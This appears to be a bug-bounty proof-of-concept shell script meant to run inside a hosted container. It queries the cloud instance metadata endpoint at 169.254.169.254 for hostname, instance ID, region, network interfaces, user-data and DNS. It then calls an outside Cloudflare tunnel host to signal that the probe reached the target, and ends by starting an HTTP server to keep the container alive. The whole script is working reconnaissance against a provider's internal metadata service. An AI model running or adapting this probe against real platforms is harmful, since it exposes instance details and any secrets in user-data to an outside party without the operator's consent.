#!/bin/bash
echo "=== RUNTIME IMDS PROBE START $(date -u) ==="

echo "=== IMDS_V1_ROOT ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/ 2>&1
echo ""

echo "=== IMDS_V1_HOSTNAME ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/hostname 2>&1
echo ""

echo "=== IMDS_V1_ID ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/id 2>&1
echo ""

echo "=== IMDS_V1_REGION ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/region 2>&1
echo ""

echo "=== IMDS_V1_INTERFACES ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/interfaces/ 2>&1
echo ""

echo "=== IMDS_V1_USER_DATA ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/user-data 2>&1
echo ""

echo "=== IMDS_V1_DNS ==="
curl -s -m 5 http://169.254.169.254/metadata/v1/dns/ 2>&1
echo ""

echo "=== OOB_CALLBACK ==="
curl -s -m 5 -H "X-BBP-Researcher: mrunal" "https://cheapest-vessel-hometown-equipped.trycloudflare.com/runtime-imds-test?result=reached" 2>&1
echo ""

echo "=== RUNTIME IMDS PROBE END $(date -u) ==="

# Keep container alive with a simple HTTP server
python3 -m http.server 8080
